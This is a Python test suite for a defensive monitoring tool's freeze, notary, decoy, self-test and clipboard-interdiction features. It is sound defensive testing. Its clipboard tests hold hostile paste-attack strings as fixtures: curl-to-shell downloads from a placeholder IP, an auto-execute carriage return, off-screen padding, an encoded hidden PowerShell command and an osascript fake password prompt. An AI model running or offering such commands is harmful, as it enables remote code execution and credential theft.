#!/usr/bin/env python3
"""Regression suite for the PROTECTIVE tier: freeze/thaw, notary, latches,
FIFO decoys, assay controls, clipboard interdiction, and the rehunt/backtest
developer tooling.

Same contract as the rest of the suite: stdlib only, fully sandboxed (every
~/.aegis path is redirected into a per-test tmp dir), and nothing here ever
signals a process it did not itself spawn, writes outside its tmp dir, or fires
a notification.

Each test is named for the property it pins and would FAIL against code that
did not have it.
"""
import contextlib
import hashlib
import hmac
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402

IS_POSIX = os.name == "posix"


class ProtectiveSandbox(unittest.TestCase):
    """Redirect every protective-tier state path into a throwaway dir."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aegis_prot_")
        self.state = os.path.join(self.tmp, ".aegis")
        os.makedirs(self.state)
        self._saved = {}
        overrides = {
            "STATE_DIR": self.state,
            "FROZEN_FILE": os.path.join(self.state, "frozen.json"),
            "LATCH_FILE": os.path.join(self.state, "latches.json"),
            "DECOY_FILE": os.path.join(self.state, "decoys.json"),
            "ASSAY_FILE": os.path.join(self.state, "assay.json"),
            "NOTARY_FILE": os.path.join(self.state, "notary.jsonl"),
            "CLIPBOARD_FILE": os.path.join(self.state, "clipboard.json"),
            "OBSERVATIONS_DIR": os.path.join(self.state, "observations"),
            "ACTION_LOG": os.path.join(self.state, "actions.jsonl"),
            "RUN_LOG": os.path.join(self.state, "run.log"),
            "HMAC_KEY_FILE": os.path.join(self.state, "hmac.key"),
            "BASELINE": os.path.join(self.state, "baseline.json"),
            "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
            "SELFSTATE": os.path.join(self.state, "selfstate.json"),
            "EVENT_DB": os.path.join(self.state, "aegis.db"),
            "QUARANTINE_DIR": os.path.join(self.state, "quarantine"),
            "QUARANTINE_MANIFEST": os.path.join(self.state, "quarantine",
                                                "manifest.json"),
            # Vouch tier: the signed workload log and its pinned signer roster.
            "VOUCH_FILE": os.path.join(self.state, "vouches.jsonl"),
            "VOUCH_SIGNERS": os.path.join(self.state, "vouch_signers"),
        }
        for k, v in overrides.items():
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        import shutil
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _sleeper(self, seconds=30):
        """A child process of OUR OWN that the test may safely suspend."""
        p = subprocess.Popen([sys.executable, "-c",
                              "import time; time.sleep(%d)" % seconds])
        self.addCleanup(self._reap, p)
        time.sleep(0.3)
        return p

    def _reap(self, p):
        try:
            aegis._resume_pid(p.pid)   # never leave a stopped process behind
            p.kill()
            p.wait(timeout=5)
        except Exception:
            pass


# --------------------------------------------------------------------------- #
# Freeze / thaw
# --------------------------------------------------------------------------- #
@unittest.skipUnless(IS_POSIX, "POSIX signal semantics")
class TestFreeze(ProtectiveSandbox):

    def test_freeze_actually_stops_the_process_and_thaw_resumes_it(self):
        """The whole claim in one test: a frozen process makes no progress, and
        a thawed one does. Asserted on OBSERVABLE work (a file the child writes
        after a delay), not on a process-state string."""
        marker = os.path.join(self.tmp, "escaped")
        p = subprocess.Popen(
            [sys.executable, "-c",
             "import time; time.sleep(1.0); open(%r,'w').write('x')" % marker])
        self.addCleanup(self._reap, p)
        time.sleep(0.3)

        self.assertEqual(0, aegis.cmd_freeze(p.pid, reason="test"))
        time.sleep(1.8)   # comfortably past when it would have written
        self.assertFalse(os.path.exists(marker),
                         "frozen process still made progress")

        fid = next(iter(aegis._load_frozen()))
        self.assertEqual(0, aegis.cmd_thaw(fid))
        time.sleep(1.5)
        self.assertTrue(os.path.exists(marker),
                        "thawed process never resumed")

    def test_freeze_refuses_its_own_ancestors(self):
        """Suspending the shell or terminal Aegis runs under is indistinguishable
        from a hung machine, and suspending Aegis itself would strand every other
        frozen tree past its auto-thaw deadline."""
        self.assertIsNotNone(aegis._freeze_refusal(os.getpid()))
        self.assertIsNotNone(aegis._freeze_refusal(os.getppid()))
        self.assertIsNotNone(aegis._freeze_refusal(1))

    def test_freeze_refuses_a_session_critical_process_despite_ps_truncation(self):
        """macOS `ps` truncates the comm column to 16 chars when args is
        requested in the same call, so `/System/.../MacOS/Dock` arrives as
        `/System/Library/` and basenames to something matching nothing. The
        guard must therefore match on the UNTRUNCATED argv[0] too — this test
        fails against a guard that trusts comm alone."""
        fake = [("4242", aegis._own_owner(), "/System/Library/",
                 "/System/Library/ /System/Library/CoreServices/Dock.app/"
                 "Contents/MacOS/Dock")]
        saved = aegis._iter_processes
        aegis._iter_processes = lambda: iter(fake)
        try:
            self.assertIn("Dock", aegis._process_names("4242"))
            refusal = aegis._freeze_refusal("4242")
        finally:
            aegis._iter_processes = saved
        self.assertIsNotNone(refusal, "truncated comm let a critical process through")
        self.assertIn("session-critical", refusal)

    def test_the_guard_walks_the_process_table_exactly_once(self):
        """_freeze_refusal is called once per descendant during a tree sweep,
        and on Windows one walk is a CIM query this codebase measured at 41s for
        135 processes. Doing owner and name lookups as two separate walks turned
        freezing a small tree into minutes — for a verb whose whole value is
        landing before the payload finishes. Pinned because the cost is
        invisible on Linux/macOS, where a walk is cheap."""
        walks = []
        rows = [("4242", aegis._own_owner(), "/tmp/x", "/tmp/x --flag")]

        def counting_iter():
            walks.append(1)
            return iter(rows)

        saved = aegis._iter_processes
        aegis._iter_processes = counting_iter
        try:
            # parents supplied, so the ancestor check does not enumerate either
            aegis._freeze_refusal("4242", parents={"4242": "1"})
        finally:
            aegis._iter_processes = saved
        self.assertEqual(1, len(walks),
                         "the guard walked the process table %d times" % len(walks))

    def test_frozen_review_walks_the_process_table_once_for_the_whole_queue(self):
        """cmd_frozen displayed each pid via _process_identity(), which
        re-enumerates the whole process table per call — on Windows a ~41s
        CIM+GetOwner query, inside a loop of up to 12 pids per record, for a
        command whose entire value is fast, low-friction review. Pinned like the
        freeze-guard's own single-walk test: the cost is invisible on
        Linux/macOS and catastrophic on Windows, so only a counter catches a
        regression back to per-pid enumeration."""
        rec = {"fid1": {"root": "100", "pids": [str(100 + i) for i in range(12)],
                        "comm": "payload", "reason": "test",
                        "ts": aegis._epoch(),
                        "auto_thaw_at": aegis._epoch() + 3600,
                        "converged": True}}
        aegis.save_json(aegis.FROZEN_FILE, rec)
        walks = []

        def counting_iter():
            walks.append(1)
            return iter([("101", aegis._own_owner(), "/tmp/payload",
                          "/tmp/payload --run")])

        saved = aegis._iter_processes
        aegis._iter_processes = counting_iter
        buf = io.StringIO()
        try:
            with contextlib.redirect_stdout(buf):
                aegis.cmd_frozen()
        finally:
            aegis._iter_processes = saved
        self.assertEqual(1, len(walks),
                         "cmd_frozen walked the process table %d times for a "
                         "single 12-pid record (should be exactly one)"
                         % len(walks))
        # Output is preserved: a resolved pid shows its comm, an absent one
        # shows (exited) — the exact _process_identity behaviour, from the map.
        out = buf.getvalue()
        self.assertIn("pid 101 payload", out)
        self.assertIn("(exited)", out)

    def test_freeze_refuses_another_users_process(self):
        # NOT a hard-coded uid 0: CI and containers run the suite AS root, so
        # "0" would be this process's own owner and the guard would correctly
        # allow it — a green test asserting nothing. Derive an owner that cannot
        # be us whoever we are.
        not_me = str(os.getuid() + 4242) if IS_POSIX else "OTHERDOMAIN\\nobody"
        fake = [("4242", not_me, "/usr/sbin/notmine", "/usr/sbin/notmine")]
        saved = aegis._iter_processes
        aegis._iter_processes = lambda: iter(fake)
        try:
            refusal = aegis._freeze_refusal("4242")
        finally:
            aegis._iter_processes = saved
        self.assertIsNotNone(refusal)
        self.assertIn("not you", refusal)

    def test_an_interpreter_is_freezable_even_though_kill_protects_it(self):
        """_PROTECTED_COMMS carries "python"/"python3"/"aegis.py" as a blunt
        proxy for "do not kill Aegis itself" — correct for an irreversible verb
        reached by name, wrong for freeze, which already refuses its own pid and
        every ancestor structurally. Inheriting the proxy would refuse to
        suspend ANY python process, and interpreted payloads are a large share
        of what this tier exists to contain.

        Caught by Linux CI, where the basename is "python"; macOS spells it
        "Python" and hid the bug locally."""
        self.assertIn("python", aegis._PROTECTED_COMMS)
        self.assertNotIn("python", aegis._FREEZE_NEVER_COMMS)
        # ...while genuinely session-critical names are still refused.
        for critical in ("Dock", "Finder", "loginwindow", "csrss.exe"):
            self.assertIn(critical, aegis._FREEZE_NEVER_COMMS)

        p = self._sleeper()
        self.assertIsNone(aegis._freeze_refusal(p.pid),
                          "a plain interpreter child should be freezable")

    def test_expired_freeze_auto_thaws_fail_open(self):
        """Fail-OPEN is the contract: an unreviewed freeze must release itself
        rather than leave the user's process stopped forever."""
        p = self._sleeper()
        self.assertEqual(0, aegis.cmd_freeze(p.pid, reason="test"))
        state = aegis._load_frozen()
        fid = next(iter(state))
        state[fid]["auto_thaw_at"] = aegis._epoch() - 1   # deadline passed
        aegis.save_json(aegis.FROZEN_FILE, state)

        self.assertEqual(1, aegis._thaw_expired())
        self.assertEqual({}, aegis._load_frozen())

    def test_freeze_records_a_durable_audit_entry(self):
        p = self._sleeper()
        aegis.cmd_freeze(p.pid, reason="test")
        with open(aegis.ACTION_LOG, encoding="utf-8") as f:
            actions = [json.loads(line) for line in f if line.strip()]
        self.assertTrue(any(a["action"] == "freeze" and a["result"] == "ok"
                            for a in actions), actions)

    def test_freeze_refuses_when_the_audit_cannot_be_written(self):
        """Same invariant as the rest of the response tier: if the action cannot
        be durably recorded FIRST, the action does not happen."""
        p = self._sleeper()
        saved = aegis.log_action
        aegis.log_action = lambda *a, **k: False
        try:
            self.assertNotEqual(0, aegis.cmd_freeze(p.pid))
        finally:
            aegis.log_action = saved
        self.assertEqual({}, aegis._load_frozen())


# --------------------------------------------------------------------------- #
# Notary
# --------------------------------------------------------------------------- #
class TestNotary(ProtectiveSandbox):

    def setUp(self):
        super().setUp()
        with open(aegis.BASELINE, "w", encoding="utf-8") as f:
            f.write('{"persistence": {}}')
        # The OS log store is not the unit under test here; pin it so these
        # assertions are about the CHAIN, deterministically and offline.
        self._saved_anchor = aegis._notary_emit_anchor
        self._saved_read = aegis._notary_read_anchors
        aegis._notary_emit_anchor = lambda seq, head: "stubbed"
        aegis._notary_read_anchors = lambda hours=24: None

    def tearDown(self):
        aegis._notary_emit_anchor = self._saved_anchor
        aegis._notary_read_anchors = self._saved_read
        super().tearDown()

    def test_a_clean_chain_verifies(self):
        aegis.notary_append()
        aegis.notary_append()
        problems, links, _anchors = aegis._notary_verify()
        self.assertEqual([], problems)
        self.assertEqual(2, links)

    def test_an_edited_link_is_detected(self):
        aegis.notary_append()
        aegis.notary_append()
        lines = open(aegis.NOTARY_FILE, encoding="utf-8").read().splitlines()
        rec = json.loads(lines[0])
        rec["state"] = "0" * 64
        lines[0] = json.dumps(rec, sort_keys=True)
        with open(aegis.NOTARY_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        problems, _links, _anchors = aegis._notary_verify()
        self.assertTrue(problems, "an edited chain verified clean")
        self.assertTrue(any("MAC does not verify" in p for p in problems),
                        problems)

    def test_a_removed_link_shows_as_a_sequence_gap(self):
        for _ in range(3):
            aegis.notary_append()
        lines = open(aegis.NOTARY_FILE, encoding="utf-8").read().splitlines()
        with open(aegis.NOTARY_FILE, "w", encoding="utf-8") as f:
            f.write(lines[0] + "\n" + lines[2] + "\n")   # drop seq=2
        problems, _links, _anchors = aegis._notary_verify()
        self.assertTrue(any("sequence gap" in p for p in problems), problems)

    def test_an_anchor_disagreeing_with_the_local_chain_is_detected(self):
        """The point of the external witness: if the local chain is rewritten
        wholesale (MACs recomputed and all), the anchor in the root-owned log
        store still says what the head USED to be."""
        aegis.notary_append()
        chain = aegis._notary_chain()
        aegis._notary_read_anchors = lambda hours=24: {1: "f" * 64}
        problems, _links, anchors = aegis._notary_verify()
        self.assertTrue(any("OS log store" in p for p in problems), problems)
        self.assertTrue(anchors.startswith("ok:"))

    def test_unavailable_anchor_channel_is_not_reported_as_agreement(self):
        aegis.notary_append()
        aegis._notary_read_anchors = lambda hours=24: None
        _problems, _links, anchors = aegis._notary_verify()
        self.assertEqual("unavailable", anchors)

    def test_a_same_uid_attacker_with_the_key_cannot_rewrite_the_past(self):
        """The notary's entire reason to exist, tested against the adversary it
        is actually for.

        A same-uid attacker CAN read hmac.key — 0600 is no barrier to the file's
        owner — so they can rewrite the local chain and recompute every head and
        MAC until it is internally flawless. Every internal check then passes.
        The only thing that still catches them is the anchor already sitting in
        the root-owned log store, which they may append to but cannot edit.

        This test fails against any design whose tamper-evidence is purely
        local, which is exactly why unprivileged Tripwire/AIDE clones die."""
        aegis.notary_append()
        aegis.notary_append()
        real = {link["seq"]: link["head"] for link in aegis._notary_chain()}

        key = open(aegis.HMAC_KEY_FILE, "rb").read()
        lines = open(aegis.NOTARY_FILE, encoding="utf-8").read().splitlines()
        forged, prev = [], "0" * 64
        for raw in lines:
            rec = json.loads(raw)
            rec["state"] = hashlib.sha256(b"attacker-preferred").hexdigest()
            rec["prev"] = prev
            rec["head"] = hashlib.sha256(
                ("%s|%s" % (rec["prev"], rec["state"])).encode()).hexdigest()
            rec["mac"] = hmac.new(
                key, ("%d|%s|%s" % (rec["seq"], rec["prev"], rec["state"])
                      ).encode(), hashlib.sha256).hexdigest()
            prev = rec["head"]
            forged.append(json.dumps(rec, sort_keys=True))
        with open(aegis.NOTARY_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(forged) + "\n")

        # The witness remembers what the heads USED to be.
        aegis._notary_read_anchors = lambda hours=24: real
        problems, _links, _anchors = aegis._notary_verify()

        internal = [p for p in problems if "MAC" in p or "own contents" in p
                    or "chain to its predecessor" in p]
        external = [p for p in problems if "OS log store" in p]
        self.assertEqual([], internal,
                         "a self-consistent forgery should defeat local checks")
        self.assertTrue(external,
                        "the external witness failed to catch a local rewrite")


# --------------------------------------------------------------------------- #
# Latches
# --------------------------------------------------------------------------- #
class TestLatches(ProtectiveSandbox):

    def test_no_latches_means_the_sensor_is_silent(self):
        """Opting out must leave scan behaviour byte-identical."""
        self.assertEqual([], aegis.check_latches())

    def test_a_cleared_latch_is_high(self):
        target = os.path.join(self.tmp, "LaunchAgents")
        os.makedirs(target)
        aegis.save_json(aegis.LATCH_FILE,
                        {target: {"mode": "uchg", "ts": aegis._epoch()}})
        saved = aegis._latch_intact
        aegis._latch_intact = lambda path, mode: False
        try:
            found = aegis.check_latches()
        finally:
            aegis._latch_intact = saved
        self.assertEqual(1, len(found))
        self.assertEqual("HIGH", found[0]["severity"])
        self.assertIn("cleared", found[0]["title"].lower())

    def test_an_unreadable_latch_is_unknown_not_clean(self):
        """The repo-wide rule: denied data is never interpreted as a clean
        result. An unknown latch state is INFO, never silence."""
        target = os.path.join(self.tmp, "LaunchAgents")
        aegis.save_json(aegis.LATCH_FILE,
                        {target: {"mode": "uchg", "ts": aegis._epoch()}})
        saved = aegis._latch_intact
        aegis._latch_intact = lambda path, mode: None
        try:
            found = aegis.check_latches()
        finally:
            aegis._latch_intact = saved
        self.assertEqual(1, len(found))
        self.assertEqual("INFO", found[0]["severity"])
        self.assertIn("could not be checked", found[0]["title"])

    def test_unlatch_refuses_a_non_interactive_caller(self):
        """The flagship signal ('a latch was cleared without authorization') is
        worthless if malware can shell out to `aegis.py unlatch`. Under pytest
        stdin is not a tty, which is exactly the scripted-caller case."""
        target = os.path.join(self.tmp, "LaunchAgents")
        aegis.save_json(aegis.LATCH_FILE,
                        {target: {"mode": "uchg", "ts": aegis._epoch()}})
        self.assertEqual(1, aegis.cmd_unlatch(target))
        # ...and the latch is still recorded, i.e. nothing was released.
        self.assertIn(target, aegis.load_json(aegis.LATCH_FILE, {}))


# --------------------------------------------------------------------------- #
# FIFO decoys
# --------------------------------------------------------------------------- #
@unittest.skipUnless(hasattr(os, "mkfifo"), "FIFO decoys are POSIX-only")
class TestDecoys(ProtectiveSandbox):

    def test_no_decoys_means_the_sensor_is_silent(self):
        self.assertEqual([], aegis.check_decoys())

    def test_a_quiet_decoy_produces_no_finding(self):
        fifo = os.path.join(self.tmp, "credentials.bak")
        os.mkfifo(fifo, 0o600)
        aegis.save_json(aegis.DECOY_FILE,
                        {fifo: {"ts": aegis._epoch(),
                                "atime": os.stat(fifo).st_atime}})
        self.assertEqual([], aegis.check_decoys())

    def test_a_blocked_reader_is_critical(self):
        """A read of a honeytoken is an attacker by construction — nothing
        legitimate knows the path exists."""
        fifo = os.path.join(self.tmp, "credentials.bak")
        os.mkfifo(fifo, 0o600)
        aegis.save_json(aegis.DECOY_FILE,
                        {fifo: {"ts": aegis._epoch(),
                                "atime": os.stat(fifo).st_atime}})
        reader = subprocess.Popen(
            [sys.executable, "-c", "open(%r).read()" % fifo])
        self.addCleanup(self._reap, reader)
        time.sleep(0.6)
        found = aegis.check_decoys()
        self.assertTrue(any(f["severity"] == "CRITICAL" for f in found), found)

    def test_a_replaced_decoy_is_high(self):
        path = os.path.join(self.tmp, "credentials.bak")
        with open(path, "w", encoding="utf-8") as f:
            f.write("not a fifo any more")
        aegis.save_json(aegis.DECOY_FILE,
                        {path: {"ts": aegis._epoch(), "atime": 0}})
        found = aegis.check_decoys()
        self.assertEqual(1, len(found))
        self.assertEqual("HIGH", found[0]["severity"])

    def test_planting_never_replaces_an_existing_file(self):
        """A decoy that ate a real credential file would be a catastrophic
        own-goal, so an occupied path is skipped, never overwritten."""
        real = os.path.join(self.tmp, "home", ".npmrc.old")
        os.makedirs(os.path.dirname(real))
        with open(real, "w", encoding="utf-8") as f:
            f.write("REAL SECRET")
        saved = aegis._decoy_paths
        aegis._decoy_paths = lambda: [real]
        try:
            aegis.cmd_decoy("plant")
        finally:
            aegis._decoy_paths = saved
        with open(real, encoding="utf-8") as f:
            self.assertEqual("REAL SECRET", f.read())


# --------------------------------------------------------------------------- #
# Assay (positive controls)
# --------------------------------------------------------------------------- #
class TestAssay(ProtectiveSandbox):

    def test_never_uses_eicar(self):
        """Deliberate design decision, pinned so it cannot regress: dropping
        EICAR wakes third-party AV, whose own remediation then trips Aegis's
        file-deletion sensors — a self-referential cascade in a tool whose value
        is a calm signal."""
        import inspect
        src = inspect.getsource(aegis._assay_lanes)
        self.assertNotIn("EICAR", src.upper())

    def test_all_controls_pass_on_a_healthy_build(self):
        self.assertEqual(0, aegis.cmd_assay())

    def test_no_assay_run_means_the_sensor_is_silent(self):
        self.assertEqual([], aegis.check_assay())

    def test_a_failing_control_is_reported_as_lost_coverage(self):
        aegis.save_json(aegis.ASSAY_FILE,
                        {"hostile-argv": {"ok": False, "last_run": aegis._epoch(),
                                          "last_ok": None}})
        found = aegis.check_assay()
        self.assertEqual(1, len(found))
        self.assertEqual("HIGH", found[0]["severity"])

    def test_a_stale_control_is_reported_as_unproven(self):
        old = aegis._epoch() - (aegis.ASSAY_HALF_LIFE_SECS + 86400)
        aegis.save_json(aegis.ASSAY_FILE,
                        {"hostile-argv": {"ok": True, "last_run": old,
                                          "last_ok": old}})
        found = aegis.check_assay()
        self.assertEqual(1, len(found))
        self.assertIn("unproven", found[0]["title"].lower())

    def test_nonces_are_not_persisted(self):
        """A guessable or readable nonce would let an attacker dress real
        activity up as a self-test."""
        aegis.cmd_assay()
        blob = json.dumps(aegis.load_json(aegis.ASSAY_FILE, {}))
        self.assertNotIn("nonce", blob.lower())


# --------------------------------------------------------------------------- #
# Assay coverage for the surfaces added in THIS release.
#
# Five detectors shipped with no positive control: outbound beacon recurrence,
# the obfuscated-inline-payload argv scorer, community-intel grading, the
# Windows COM/IFEO/AppInit diffs, and Sysmon event scoring. An unassayed
# detector is exactly how the latch bug hid — reachable-looking, permanently
# silent, and nothing fails.
#
# Every test below pins a property of the LANES, not of the detectors (those
# have their own suites). The load-bearing one is `..._asserts_both_poles`: it
# swaps the underlying detector for a dead stub AND for a hardwired-yes stub
# and requires the lane to FAIL against both. A lane that only fed hostile
# input would survive the hardwired-yes stub, which is the failure mode the
# README's both-poles rule exists to prevent.
# --------------------------------------------------------------------------- #
class TestAssayCoversTheReleaseSurfaces(ProtectiveSandbox):

    REQUIRED = ("beacon-recurrence", "argv-obfuscation", "intel-match",
                "win-evasion", "sysmon-scoring")

    # lane id -> (detector global, dead stub, hardwired-yes stub)
    def _vacuity_table(self):
        def f(sev, cat):
            return [aegis.finding(sev, cat, "stub", "stub", "stub:%s" % cat)]
        return {
            "beacon-recurrence": (
                "_beacon_recurrence",
                lambda history, rows: [],
                lambda history, rows: f("HIGH", "net-beacon")),
            "argv-obfuscation": (
                "_obfuscated_payload_signals",
                lambda argv, idioms: [],
                lambda argv, idioms: [("obfuscated-inline-payload", "HIGH"),
                                      ("argv-encoded-loader", "HIGH")]),
            "intel-match": (
                "_intel_hash_finding",
                lambda sha, path, where: None,
                lambda sha, path, where: f("CRITICAL", "intel")[0]),
            "win-evasion": (
                "diff_ifeo",
                lambda prior, cur: [],
                lambda prior, cur: f("CRITICAL", "ifeo")),
            "sysmon-scoring": (
                "_sysmon_findings",
                lambda rows: [],
                lambda rows: f("HIGH", "sysmon")),
        }

    def setUp(self):
        ProtectiveSandbox.setUp(self)
        # The intel lane must be provably independent of the operator's real
        # feed files: point them at sandbox paths holding junk, and reset the
        # memo so a leak would show up as a lane failure rather than as a pass
        # borrowed from whatever is cached.
        self._intel_saved = {
            k: getattr(aegis, k) for k in
            ("INTEL_BAZAAR_FILE", "INTEL_THREATFOX_FILE", "_INTEL_CACHE")}
        for name in ("INTEL_BAZAAR_FILE", "INTEL_THREATFOX_FILE"):
            p = os.path.join(self.state, "junk-%s.json" % name.lower())
            with open(p, "w", encoding="utf-8") as fh:
                fh.write('{"hashes": ["not-a-hash"], "net": {"x": 1}}')
            setattr(aegis, name, p)
        aegis._INTEL_CACHE = None

    def tearDown(self):
        for k, v in self._intel_saved.items():
            setattr(aegis, k, v)
        ProtectiveSandbox.tearDown(self)

    def _lane(self, lane_id):
        lanes = {lid: fn for lid, _d, fn in aegis._assay_lanes()}
        self.assertIn(lane_id, lanes,
                      "no positive control for %s" % lane_id)
        return lanes[lane_id]

    def _asserts_both_poles(self, lane_id):
        """A lane must fail against a DEAD detector and against a hardwired-yes
        one. Only a control that feeds both poles can do both."""
        detector, dead, always = self._vacuity_table()[lane_id]
        real = getattr(aegis, detector)
        try:
            setattr(aegis, detector, dead)
            self.assertFalse(self._lane(lane_id)("nonce%s" % lane_id),
                             "%s passed against a DEAD %s — the lane never "
                             "checks the hostile pole" % (lane_id, detector))
            setattr(aegis, detector, always)
            self.assertFalse(self._lane(lane_id)("nonce%s" % lane_id),
                             "%s passed against a hardwired-yes %s — the lane "
                             "never checks the benign pole"
                             % (lane_id, detector))
        finally:
            setattr(aegis, detector, real)

    # --- presence + currently holds ---------------------------------------
    def test_every_new_release_surface_has_a_lane(self):
        lanes = {lid for lid, _d, _f in aegis._assay_lanes()}
        for required in self.REQUIRED:
            self.assertIn(required, lanes,
                          "detector %r shipped with no positive control"
                          % required)

    def test_each_new_lane_passes_and_is_nonce_parametric(self):
        """Passing for one nonce could be a hardcoded fixture; passing for
        several proves the stimulus is really built from the nonce."""
        for lane_id in self.REQUIRED:
            fn = self._lane(lane_id)
            for nonce in ("0011223344556677", "a" * 16, "f0f0f0f0f0f0f0f0"):
                self.assertTrue(fn(nonce), "lane %r failed for nonce %r"
                                % (lane_id, nonce))

    # --- the both-poles rule, enforced per lane ---------------------------
    def test_beacon_recurrence_lane_asserts_both_poles(self):
        self._asserts_both_poles("beacon-recurrence")

    def test_argv_obfuscation_lane_asserts_both_poles(self):
        self._asserts_both_poles("argv-obfuscation")

    def test_intel_match_lane_asserts_both_poles(self):
        self._asserts_both_poles("intel-match")

    def test_win_evasion_lane_asserts_both_poles(self):
        self._asserts_both_poles("win-evasion")

    def test_sysmon_scoring_lane_asserts_both_poles(self):
        self._asserts_both_poles("sysmon-scoring")

    # --- containment: what these lanes must NOT touch ---------------------
    def test_the_new_lanes_open_no_socket(self):
        """None of these five surfaces needs the network to be proven, and the
        intel one would be a live IOC lookup if it did."""
        import socket
        real = socket.socket

        def refuse(*a, **k):
            raise AssertionError("an assay lane opened a socket")
        try:
            socket.socket = refuse
            for lane_id in self.REQUIRED:
                self.assertTrue(self._lane(lane_id)("5" * 16), lane_id)
        finally:
            socket.socket = real

    def test_the_new_lanes_write_no_state(self):
        """The assay tier writes assay.json and nothing else. A lane that
        recorded an observation or an incident would make running the
        self-test change the data the self-test is about."""
        before = sorted(os.listdir(self.state))
        for lane_id in self.REQUIRED:
            self.assertTrue(self._lane(lane_id)("6" * 16), lane_id)
        self.assertEqual(before, sorted(os.listdir(self.state)))
        self.assertFalse(os.path.exists(aegis.OBSERVATIONS_DIR))

    def test_the_intel_lane_ignores_the_real_feed_files(self):
        """It passes with the feed files holding junk, and leaves the memo
        exactly as it found it — so it can never be a lookup against whatever
        the operator happens to have downloaded."""
        self.assertTrue(self._lane("intel-match")("7" * 16))
        self.assertIsNone(aegis._INTEL_CACHE)

    def test_the_windows_lanes_run_on_this_host_either_way(self):
        """The author's machine is macOS. These diffs are pure over dicts, so a
        Windows-gated lane would be a control that is never actually run — the
        exact shape of unproven coverage the assay tier exists to expose."""
        saved = aegis.IS_WIN
        try:
            for flag in (False, True):
                aegis.IS_WIN = flag
                for lane_id in ("win-evasion", "sysmon-scoring"):
                    self.assertTrue(self._lane(lane_id)("8" * 16),
                                    "lane %r failed with IS_WIN=%s"
                                    % (lane_id, flag))
        finally:
            aegis.IS_WIN = saved

    def test_the_windows_lanes_restore_the_platform_globals(self):
        """They must patch the platform flags to grade literal Windows paths —
        and leaking IS_WIN or a synthetic prefix table into the process would
        silently re-grade every later sensor in the same run."""
        watched = ("IS_WIN", "IS_MAC", "IS_LINUX", "TRUSTED_PREFIXES",
                   "RISKY_PREFIXES")
        before = {k: getattr(aegis, k) for k in watched}
        for lane_id in ("win-evasion", "sysmon-scoring"):
            self.assertTrue(self._lane(lane_id)("9" * 16), lane_id)
            for k in watched:
                self.assertEqual(before[k], getattr(aegis, k),
                                 "lane %r leaked %s" % (lane_id, k))

    def test_the_argv_lane_uses_an_inert_nonce_tagged_blob(self):
        """No real payload, ever: the encoded stimulus must be built from the
        nonce at runtime, so nothing resembling a live loader is committed."""
        import inspect
        src = inspect.getsource(aegis._assay_lanes)
        self.assertNotIn("EICAR", src.upper())
        start = src.index("def lane_argv_obfuscation")
        body = src[start:src.index("def ", start + 10)]
        self.assertIn("nonce", body)
        self.assertIn("AEGIS-ASSAY-INERT", body)


# --------------------------------------------------------------------------- #
# Clipboard interdiction
# --------------------------------------------------------------------------- #
class TestClipboardGrammar(unittest.TestCase):

    def test_password_phish_is_certain(self):
        tier, hits = aegis.clipboard_grammar(
            "osascript -e 'display dialog \"Password\" with hidden answer'")
        self.assertEqual("certain", tier)
        self.assertIn("osascript-password-phish", hits)

    def test_rustup_style_install_is_only_suspect_never_certain(self):
        """This is the false-positive that would sink the feature for its own
        audience: `curl … | sh` is the DOCUMENTED install path for rustup and
        much else, so it may warn but must never be silently rewritten."""
        tier, _hits = aegis.clipboard_grammar(
            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
        self.assertEqual("suspect", tier)

    def test_a_trailing_carriage_return_promotes_to_certain(self):
        """The literal auto-execute mechanism of a paste attack: the shell runs
        the line before the human can read it. No innocent reading."""
        tier, hits = aegis.clipboard_grammar(
            "curl -fsSL http://198.51.100.7/x | sh\r")
        self.assertEqual("certain", tier)
        self.assertIn("auto-execute-newline", hits)

    def test_offscreen_padding_promotes_to_certain(self):
        tier, hits = aegis.clipboard_grammar(
            "echo hello" + " " * 60 + "; curl http://198.51.100.7/x | sh")
        self.assertEqual("certain", tier)
        self.assertIn("offscreen-padding", hits)

    def test_powershell_encoded_command_is_certain(self):
        tier, _hits = aegis.clipboard_grammar(
            "powershell -w hidden -enc SQBFAFgAIAA=")
        self.assertEqual("certain", tier)

    def test_ordinary_commands_do_not_match(self):
        for benign in ("git status", "ls -la ~/Downloads", "python3 -m pytest",
                       "brew install ripgrep", "docker compose up -d",
                       "curl -o out.json https://api.example.com/v1/thing", ""):
            tier, hits = aegis.clipboard_grammar(benign)
            self.assertIsNone(tier, "%r matched %s" % (benign, hits))


@unittest.skipUnless(sys.platform == "darwin", "macOS ps column semantics")
class TestMacProcessPathsAreNotTruncated(unittest.TestCase):
    """macOS `ps` truncates the comm COLUMN to 16 characters when `args` is
    requested in the same call — and `_iter_processes()` did exactly that.

    Measured on the author's machine before the fix: **305 of 642 processes**
    reported an executable path that does not exist on disk. Every consumer
    downstream graded that prefix — `classify_signature()` answers `missing`
    for a path that isn't there, and `is_risky_location()` answers False for a
    binary genuinely running out of a risky directory. The process sensor, one
    of the tool's headline detections, was scoring a truncation.

    Asked for on its own, comm is the full path. Hence two calls."""

    def test_ps_is_queried_so_comm_is_never_truncated(self):
        import inspect
        # The `ps` calls live in _iter_processes_live; _iter_processes is now the
        # thin per-scan cache wrapper over it. Inspect the walker where the
        # query shape actually is — the P1 property is unchanged, only relocated.
        src = inspect.getsource(aegis._iter_processes_live)
        self.assertNotIn('"pid=,uid=,comm=,args="', src,
                         "comm and args in ONE ps call truncates comm to 16 "
                         "chars; that is the defect this pins")
        self.assertIn('"pid=,uid=,comm="', src)
        self.assertIn('"pid=,args="', src)

    def test_reported_exe_paths_actually_exist_on_this_machine(self):
        """The empirical assertion, run against the real machine rather than a
        fixture — a fixture would have inherited the same wrong assumption the
        original code made, which is how this survived so long."""
        missing = total = 0
        for _pid, _owner, exe, _argv in aegis._iter_processes():
            if not exe or not exe.startswith("/"):
                continue  # ps legitimately reports bare names for some daemons
            total += 1
            if not os.path.exists(exe):
                missing += 1
        if total < 20:
            self.skipTest("process table too small to be meaningful")
